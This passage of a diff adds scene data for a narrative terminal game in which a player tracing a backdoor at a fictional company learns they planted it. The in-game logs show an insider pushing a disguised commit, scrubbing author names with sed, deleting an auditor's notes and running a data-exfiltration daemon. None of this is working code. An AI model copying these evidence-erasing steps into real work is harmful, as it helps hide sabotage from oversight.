+          "content": "[green]$ cat ssh-registry.txt[/green]\n\n[bold]NovaCorp SSH Key Registry[/bold]\n[dim]Last updated: 2026-03-17[/dim]\n\n[dim]USER              FINGERPRINT                                    REGISTERED[/dim]\n[dim]sarah.chen         SHA256:aB1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV        2024-01-15[/dim]\n[dim]alex.wong          SHA256:bC2dE3fG4hI5jK6lM7nO8pQ9rS0tU1vW        2024-03-22[/dim]\n[dim]chenmo             SHA256:cD3eF4gG5hI6jK7lM8nO9pQ0rS1tU2vW        2024-06-10[/dim]\n[bold red]{player_name}          SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE        2024-02-01[/bold red]\n[dim]li.wei             SHA256:dE4fG5hH6iJ7kL8mN9oP0qR1sT2uV3wX        2024-08-15[/dim]\n[dim]zhang.yu           SHA256:eF5gH6iI7jK8lM9nO0pQ1rS2tU3vW4xY        2025-01-20[/dim]\n\n\n[bold red]No.[/bold red]\n\n[bold red]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/bold red]\n\n[bold red]This fingerprint belongs to — {player_name}.[/bold red]\n\n[bold red]It's you.[/bold red]",
+          "takeable": false
+        },
+        {
+          "name": "access-log.txt",
+          "description": "Server access log",
+          "content": "[green]$ cat access-log.txt[/green]\n\n[bold]Server Access Log - 2025-12-18[/bold]\n\n[dim]TIME        USER              SOURCE IP        ACTION[/dim]\n[dim]03:42:15    {player_name}          10.20.1.88       SSH login[/dim]\n[dim]03:43:01    {player_name}          10.20.1.88       cd /repos/nova-geo-core[/dim]\n[dim]03:44:30    {player_name}          10.20.1.88       git checkout -b security-patch[/dim]\n[dim]03:45:12    {player_name}          10.20.1.88       vim src/core/validator.ts[/dim]\n[dim]03:47:22    {player_name}          10.20.1.88       git commit -S -m \"security: patch CVE-2025-41205\"[/dim]\n[dim]03:47:45    {player_name}          10.20.1.88       git push origin security-patch[/dim]\n[dim]03:48:01    {player_name}          10.20.1.88       git merge security-patch --no-ff[/dim]\n[dim]03:48:30    {player_name}          10.20.1.88       git log --format=\"%H %an\" | sed 's/{player_name}/<wiped>/'[/dim]\n[dim]03:49:02    {player_name}          10.20.1.88       logout[/dim]\n\n[bold red]Every single line. Your username. Your IP. Your machine.[/bold red]\n\n[bold red]December 18, 2025. 3:42 AM.\nYou logged into the code server, injected the backdoor, signed the commit with your SSH key,\nthen tried to scrub the author info with sed.[/bold red]\n\n[bold yellow]You wiped the Author field. But you forgot that SSH signatures are verified independently.[/bold yellow]\n\n[dim]Check [bold]cat hostname-log.txt[/bold] to confirm the source machine.[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "hostname-log.txt",
+          "description": "Source hostname record",
+          "content": "[green]$ cat hostname-log.txt[/green]\n\n[bold]Hostname Resolution Log - 2025-12-18[/bold]\n\n[dim]IP: 10.20.1.88[/dim]\n[dim]Hostname: [bold red]{player_name}-MacBook.local[/bold red][/dim]\n[dim]MAC: 3C:22:FB:A1:7D:E2[/dim]\n[dim]DHCP Lease: 2025-12-18 03:40:00 - 2025-12-19 03:40:00[/dim]\n\n[bold red]{player_name}-MacBook.local[/bold red]\n\n[bold red]That's the machine you're sitting at right now.[/bold red]",
+          "takeable": false
+        },
+        {
+          "name": "local-ssh-key.txt",
+          "description": "Local SSH key comparison",
+          "content": "[green]$ cat local-ssh-key.txt[/green]\n\n[bold]Local Key Verification:[/bold]\n\n[dim]$ ssh-keygen -lf ~/.ssh/id_rsa.pub[/dim]\n[bold red]4096 SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE {player_name}@{player_name}-MacBook.local (RSA)[/bold red]\n\n[dim]$ cat ~/.ssh/id_rsa.pub | head -c 80[/dim]\n[dim]ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDxK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE...[/dim]\n\n[bold red]Your local SSH key fingerprint matches the poisoned commit's signature. Exactly.[/bold red]\n\n[bold yellow]This wasn't stolen. SSH signing requires the private key.\nAnd your private key only exists on this machine.[/bold yellow]",
+          "takeable": false
+        }
+      ],
+      "commands": {
+        "grep": {
+          "name": "grep",
+          "keywords": {
+            "xk9": "[green]$ grep -ri 'xK9mR3' *[/green]\n\ngit-blame.txt: Fingerprint: [red]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/red]\nssh-registry.txt: {player_name}  [red]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/red]\nlocal-ssh-key.txt: [red]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/red] {player_name}@{player_name}-MacBook.local\n\n[bold red]Three matches. The poisoned commit, the company registry, your local key. All the same.[/bold red]",
+            "fingerprint": "[green]$ grep -i 'fingerprint' *[/green]\n\ngit-blame.txt: Fingerprint: [bold red]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/bold red]\nssh-registry.txt: {player_name}  SHA256:[bold red]xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/bold red]\n\n[bold red]Attacker's fingerprint = your fingerprint[/bold red]",
+            "{player_name}": "[green]$ grep '{player_name}' *[/green]\n\nssh-registry.txt: [red]{player_name}[/red]  SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE\naccess-log.txt: [red]{player_name}[/red]  10.20.1.88  (9 occurrences)\nhostname-log.txt: [red]{player_name}[/red]-MacBook.local\n\n[bold red]Your name. Everywhere.[/bold red]",
+            "10.20.1.88": "[green]$ grep '10.20.1.88' *[/green]\n\naccess-log.txt: [red]10.20.1.88[/red] (9 occurrences)\nhostname-log.txt: IP: [red]10.20.1.88[/red] → {player_name}-MacBook.local\n\n[bold red]That IP resolves to your laptop. Your Mac.[/bold red]",
+            "2025-12-18": "[green]$ grep '2025-12-18' *[/green]\n\ngit-blame.txt: 2025-12-18 03:47:22\naccess-log.txt: [red]2025-12-18[/red] 03:42-03:49 (9 action records)\nhostname-log.txt: DHCP Lease: [red]2025-12-18[/red]\n\n[bold yellow]December 18, 2025. The early hours. Do you remember what happened that night?[/bold yellow]\n[dim]You don't. You have no memory of it at all.[/dim]",
+            "helpme": "[green]$ grep -ri 'helpMe' *[/green]\n\n[dim](No matches found on the forensics server)[/dim]\n\n[bold yellow]Wait... think back to those variable names in Chen Mo's code.\nhelpMe, trapped, floor12 —\nIf Chen Mo already knew the attacker was you...\nthen those weren't his distress signals.\nHe was tagging you. He was asking someone else for help — help me catch this person.[/bold yellow]",
+            "Chen Mo": "[green]$ grep 'Chen Mo' *[/green]\n\n[dim](No direct records of Chen Mo on the forensics server)[/dim]\n\n[bold yellow]Chen Mo was tracking the attacker when he was found out.\nBut if the attacker is you... then who took Chen Mo?\nWas it \"you\"? Did you do more than just write the backdoor that night?[/bold yellow]"
+          },
+          "add_flag": "used_grep_vault"
+        },
+        "history": {
+          "name": "history",
+          "response": "[green]$ history[/green]\n\nYou check the command history on vault-internal.\n\nThen you freeze.\n\nBecause this forensics server has a record of [bold red]a previous login by you[/bold red]:\n\n[dim]2026-03-15 02:15:33[/dim] {player_name} - login from 10.20.1.88\n[dim]2026-03-15 02:16:01[/dim] {player_name} - cat chenmo-audit.md\n[dim]2026-03-15 02:16:45[/dim] {player_name} - rm -f chenmo-original-notes.txt\n[dim]2026-03-15 02:17:02[/dim] {player_name} - logout\n\n[bold red]Three days ago — the same day Chen Mo disappeared — you logged into this server at 2 AM,\nread Chen Mo's audit notes, then deleted his original notes file.[/bold red]\n\n[bold red]You have no memory of this.[/bold red]",
+          "add_flag": "found_vault_history"
+        },
+        "scan": {
+          "name": "scan",
+          "response": "[green]$ scan[/green]\n\n[dim]10.20.1.10   - prod-bastion    [ONLINE][/dim]\n[dim]10.20.2.50   - code-review     [ONLINE][/dim]\n[dim]10.20.3.100  - vault-internal  [ONLINE] ← you are here[/dim]\n[red]203.0.113.42 - ??? [EXTERNAL] [ACTIVE] ← data flowing in[/red]\n\n[bold red]The external receiving server is still active. Data is still bleeding out.[/bold red]",
+          "add_flag": "scanned_external"
+        }
+      },
+      "transitions": {
+        "cat_local-ssh-key.txt": {
+          "trigger": "cat_local-ssh-key.txt",
+          "message": "\n\n[bold red]You stare at your own SSH fingerprint on the screen. Your mind goes blank.[/bold red]\n\n[dim]Every link in the evidence chain snaps shut.\nAttacker's signature = your SSH key = your local private key.\nNot stolen. Not spoofed. You.[/dim]\n\n[bold yellow]But you have no memory of any of it.\nWhat did you do that night?[/bold yellow]\n\nThe terminal drops you back to your local environment...",
+          "requires_flags": [],
+          "requires_items": [],
+          "target_scene": "the_mirror"
+        },
+        "decrypt_access-log.txt": {
+          "trigger": "decrypt_access-log.txt",
+          "message": "[dim]This file doesn't need decrypting. Just [bold]cat access-log.txt[/bold] to read it.[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        }
+      }
+    },
+    {
+      "id": "the_mirror",
+      "name": "The Mirror",
+      "ascii_art": "final_message.txt",
+      "description": "Your terminal. Your command history. Your SSH key. Your IP address. Your hostname.\n\nAll evidence points to the same person.",
+      "on_enter": "[bold red]You sit in the dark, staring at the screen.[/bold red]\n\nThe clues rearrange themselves in your head —\n\nPoisoned commit b8e224f. 3:47 AM.\nSSH signature: your key.\nServer logs: your username, your IP, your hostname.\n\nYou have no memory of that night.\n\n[bold yellow]Then you reread Chen Mo's variable names. And everything shifts.[/bold yellow]\n\n[dim]Use [bold]cat reinterpretation.txt[/bold] to see the clues in a new light.\nUse [bold]history[/bold] to check your own command history.[/dim]",
+      "items": [
+        {
+          "name": "reinterpretation.txt",
+          "description": "Reinterpreting Chen Mo's code signals",
+          "content": "[green]$ cat reinterpretation.txt[/green]\n\n[bold]Reinterpreting Chen Mo's Code Signals:[/bold]\n\nYou assumed those variable names were Chen Mo calling for help.\nBut Chen Mo already knew the attacker was you.\n\nHe wasn't calling for help. He was [bold red]tagging you[/bold red].\n\n[yellow]What you thought:[/yellow]\n  helpMe → Chen Mo calling for help\n  trapped → Chen Mo is trapped\n  floor12 → The floor where Chen Mo is held\n  needsRescue → Chen Mo needs rescue\n  88 Luoqing Road, Hedong District → Where Chen Mo is being held\n\n[red]What it actually means:[/red]\n  helpMe → [bold red]Help me — I found {player_name}'s backdoor[/bold red]\n  trapped → [bold red]I'm being watched by {player_name} — I can't get out[/bold red]\n  floor12 → [bold red]{player_name} planted the code from the server room on floor 12[/bold red]\n  needsRescue → [bold red]Someone come save me — {player_name} is coming for me[/bold red]\n  88 Luoqing Road, Hedong District → [bold red]Physical location of the evidence backup — in case {player_name} deletes it remotely[/bold red]\n\n[bold red]Chen Mo wasn't kidnapped by some shadowy organization.\nChen Mo was cornered by you. Or worse.[/bold red]\n\n[dim]Try [bold]history[/bold] to check your local command history.[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "bash_history.txt",
+          "description": "Your machine's .bash_history",
+          "content": "[green]$ cat bash_history.txt[/green]\n\n[bold]~/.bash_history (local machine)[/bold]\n\n[dim]# 2025-12-18 03:35[/dim]\n[red]ssh -i ~/.ssh/id_rsa code-review.novacorp.internal[/red]\n[red]cd /repos/nova-geo-core[/red]\n[red]git checkout -b security-patch[/red]\n[red]# recovered from vim history[/red]\n[red]# edited src/core/validator.ts[/red]\n[red]# inserted obfuscated backdoor code[/red]\n[red]git add -A[/red]\n[red]git commit -S -m \"security: patch CVE-2025-41205 geolocation validation\"[/red]\n[red]git push origin security-patch[/red]\n[red]git checkout main && git merge security-patch --no-ff[/red]\n[red]git log --format=\"%H %an\" | sed 's/{player_name}/<wiped>/'[/red]\n[red]git push origin main --force[/red]\n\n[dim]# 2026-03-15 02:10[/dim]\n[red]ssh vault-internal.novacorp.internal[/red]\n[red]cat chenmo-audit.md[/red]\n[red]rm -f chenmo-original-notes.txt[/red]\n\n[bold red]It's all here. Every last command.[/bold red]\n\n[bold red]First entry: SSH into the code server.\nLast entry: delete Chen Mo's original notes.[/bold red]\n\n[bold yellow]Your .bash_history recorded everything.\nYou just don't remember any of it.[/bold yellow]",
+          "takeable": false
+        },
+        {
+          "name": "timeline.txt",
+          "description": "Event timeline",
+          "content": "[green]$ cat timeline.txt[/green]\n\n[bold]Event Timeline:[/bold]\n\n[dim]2025-12-18 03:35[/dim]  You ({player_name}) log into the code server\n[dim]2025-12-18 03:47[/dim]  You commit the backdoor (commit b8e224f)\n[dim]2025-12-18 03:49[/dim]  You wipe the Author field and force-push\n[dim]......[/dim]\n[dim]2026-03-02 11:30[/dim]  You update geo-core dependency to the backdoored v2.8.4\n[dim]2026-03-14 ??:??[/dim]  Chen Mo completes audit, finds backdoor, traces it to you\n[dim]2026-03-15 02:10[/dim]  You log into the forensics server and delete Chen Mo's notes\n[dim]2026-03-15 ??:??[/dim]  Chen Mo goes dark\n[dim]2026-03-15 14:22[/dim]  Chen Mo's final PR (hidden signals) is merged\n[dim]2026-03-18 02:58[/dim]  Backdoor triggers early (your failsafe?)\n[dim]2026-03-18 03:00[/dim]  PagerDuty alert fires. You wake up.\n\n[bold red]The 3 AM PagerDuty alert didn't wake you up to fix a bug.\n\nIt woke you up to clean up your mess.[/bold red]\n\n[dim]Try [bold]cat final_message.txt[/bold][/dim]",
+          "takeable": false
+        },
+        {
+          "name": "final_message.txt",
+          "description": "Final message",
+          "content": "[green]$ cat final_message.txt[/green]\n\nThe terminal screen flickers.\n\nA new message appears:\n\n[bold red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]\n\n  [bold red]From: {player_name}[/bold red]\n  [bold red]To: {player_name}[/bold red]\n  [bold red]Timestamp: 2025-12-18 03:50:00[/bold red]\n  [bold red]Subject: For when you wake up[/bold red]\n\n  [italic red]\"Everything is deployed.\n\n  You won't remember what you did tonight.\n  That's by design.\n\n  When the alert goes off, you'll think you're here to fix a bug.\n  You'll trace the logs. You'll find Chen Mo's clues.\n  You'll play the righteous engineer, peeling back layers of truth.\n\n  But the truth is you.\n\n  Do you remember now?\"[/italic red]\n\n[bold red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]",
+          "takeable": false
+        }
+      ],
+      "commands": {
+        "history": {
+          "name": "history",
+          "response": "[green]$ history[/green]\n\n[bold]Your local shell history:[/bold]\n\n[red]  1  ssh -i ~/.ssh/id_rsa code-review.novacorp.internal[/red]\n[red]  2  cd /repos/nova-geo-core[/red]\n[red]  3  vim src/core/validator.ts[/red]\n[red]  4  git commit -S -m \"security: patch CVE-2025-41205\"[/red]\n[red]  5  git push origin main --force[/red]\n[red]  6  git log --format=\"%H %an\" | sed 's/{player_name}/<wiped>/'[/red]\n[dim]  ...[/dim]\n[red]  47 ssh vault-internal.novacorp.internal[/red]\n[red]  48 rm -f chenmo-original-notes.txt[/red]\n\n[bold red]The first entry in your .bash_history is the command that connected to the server to push the malicious code.[/bold red]\n\n[bold red]This history was never cleared.\nBecause you needed it.\nAs insurance.\nOr as evidence — left for yourself when you woke up.[/bold red]",
+          "add_flag": "found_own_history"
+        },
+        "grep": {
+          "name": "grep",
+          "keywords": {
+            "{player_name}": "[green]$ grep '{player_name}' *[/green]\n\n[red]Matches: 42[/red]\n\n[bold red]Your name. Everywhere.\nEvery log, every signature, every login.\nAll you.[/bold red]",
+            "remember": "[green]$ grep -i 'remember' *[/green]\n\nfinal_message.txt: [red]Do you remember now?[/red]\n\n[bold red]Do you remember now?[/bold red]",
+            "Chen Mo": "[green]$ grep 'Chen Mo' *[/green]\n\nreinterpretation.txt: Help me — I found {player_name}'s backdoor\ntimeline.txt: Chen Mo completes audit, finds backdoor, traces it to you\ntimeline.txt: Chen Mo goes dark\n\n[bold red]Chen Mo knew the truth. So Chen Mo disappeared.[/bold red]"
+          },
+          "add_flag": "grep_in_mirror"
+        },
+        "scan": {
+          "name": "scan",
+          "response": "[green]$ scan[/green]\n\n[red]Scanning local network connections...\n\nESTABLISHED  10.20.1.88:22    → 203.0.113.42:8443\n  Process: geo-export-daemon (PID 31337)\n  Started: 2025-12-18 03:50:01\n  Status:  ACTIVE\n  Data sent: 1.2 TB[/red]\n\n[bold red]There's a daemon running on your machine.\nIt's been running since three months ago.\nQuietly feeding data to 203.0.113.42.\n\nPID 31337. Leet speak for \"elite.\"\n\nYou set this up yourself.[/bold red]",
+          "add_flag": "found_daemon"
+        }
+      },
+      "transitions": {
+        "cat_final_message.txt": {
+          "trigger": "cat_final_message.txt",
+          "message": "",
+          "requires_flags": [],
+          "requires_items": [],
+          "target_scene": "ending"
+        }
+      }
+    },
+    {
+      "id": "ending",
+      "name": "Endgame",
+      "ascii_art": "final_message.txt",
+      "description": "A single line blinks on the screen.",
+      "on_enter": "[bold red]The terminal screen flickers violently.[/bold red]\n\nEvery window closes at once.\n\nThe screen goes black.\n\nThen, one line fades in:\n\n\n[bold red]\"Do you remember now?\"[/bold red]\n\n\n[dim]......[/dim]\n\n[dim]......[/dim]\n\n[dim]......[/dim]\n\n\n[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n  [dim]⏰ Current time: 03:58 AM[/dim]\n  [dim]⏰ Full backdoor trigger: 08:00 AM[/dim]\n  [dim]⏰ Time remaining: 4 hours 2 minutes[/dim]\n\n  [dim]Affected users: 2,340,000[/dim]\n  [dim]Data already leaked: 412,000 real-time location records[/dim]\n  [dim]Export still in progress...[/dim]\n\n[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n\nYou're sitting in your bedroom at 4 AM.\n\nThe cold glow of the laptop screen on your face.\n\nYou know the truth now. The attacker is you.\nYou don't remember doing any of it, but evidence doesn't lie.\n\nChen Mo tried to stop you. Then Chen Mo vanished.\n\nNow you have two choices:\nStop the backdoor before it fully triggers — and admit everything.\nOr close the laptop and go back to sleep.\n\nYou choose to sit still.\n\nBecause you're not sure —\nif you fall asleep again, whether you'll wake up as the same person.\n\n\n[bold]End of Chapter 1.[/bold]\n\n\n[dim cyan]>>> SIGNAL LOST <<<[/dim cyan]\n\n[dim]Type [bold]wake[/bold] to continue to Chapter 2, or [bold]quit[/bold] to exit the game.[/dim]",
+      "items": [],
+      "commands": {
+        "wake": {
+          "name": "wake",
+          "response": "",
+          "transition": "dawn"
+        },
+        "sleep": {
+          "name": "sleep",
+          "response": "",
+          "transition": "dawn"
+        },
+        "continue": {
+          "name": "continue",
+          "response": "",
+          "transition": "dawn"
+        }
+      },
+      "transitions": {}
+    }
+  ]
+}
